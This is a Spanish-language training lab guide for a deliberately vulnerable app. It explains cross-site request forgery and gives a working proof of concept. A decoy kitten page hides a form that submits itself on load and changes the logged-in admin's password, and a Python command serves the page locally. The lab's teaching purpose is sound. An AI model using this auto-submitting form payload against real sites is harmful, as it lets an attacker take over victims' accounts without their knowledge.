# Laboratorio 11: Cross-Site Request Forgery (CSRF)

## 🎯 Objetivo
Forzar a un usuario autenticado (la víctima) a realizar una acción no deseada sin su consentimiento, como cambiar su propia contraseña.

## 📋 Prerrequisitos
1.  **Entorno:** Cadel Academy en Modo Vulnerable.
2.  **Víctima:** Una sesión activa en el navegador (ej. como 'admin').
3.  **Atacante:** Un editor de texto y un servidor web simple (Python).

## 📝 Instrucciones Paso a Paso

La vulnerabilidad de CSRF existe porque los formularios de la aplicación que cambian el estado (como el de cambiar contraseña) no incluyen un token único y secreto para verificar que la petición se originó en la propia aplicación. El servidor confía ciegamente en la cookie de sesión del usuario.

### Paso 1: Crear la Página Maliciosa
En tu máquina de atacante (o en una carpeta local), crea un archivo llamado `csrf_attack.html`. Este archivo contendrá un formulario oculto que imita al de "Cambiar Contraseña" del perfil.

```html
<html>
  <body>
    <h1 style="font-family: sans-serif;">Página de Gatitos Inofensiva</h1>
    <img src="https://placekitten.com/400/300" alt="Un gatito">

    <!-- Formulario CSRF oculto -->
    <form id="csrf-form" action="http://localhost:8080/profile" method="POST" style="display:none;">
      <input type="hidden" name="action" value="change_password" />
      <!-- Para este PoC, asumimos que el atacante conoce la contraseña actual (admin123). -->
      <input type="hidden" name="current_password" value="admin123" />
      <input type="hidden" name="new_password" value="pwned123" />
    </form>

    <script>
      // Enviar el formulario automáticamente al cargar la página
      document.getElementById('csrf-form').submit();
    </script>
  </body>
</html>
```

### Paso 2: Servir la Página Maliciosa
1.  Abre una terminal en la carpeta donde guardaste `csrf_attack.html`.
2.  Inicia un servidor web simple en el puerto 9000:
    ```bash
    python3 -m http.server 9000
    ```
3.  Tu página maliciosa ahora está disponible en `http://localhost:9000/csrf_attack.html`.

### Paso 3: Ejecutar el Ataque
1.  Asegúrate de estar logueado como **admin** en `http://localhost:8080`.
2.  En otra pestaña, visita `http://localhost:9000/csrf_attack.html`.
3.  Serás redirigido al perfil y tu contraseña habrá cambiado a `pwned123`.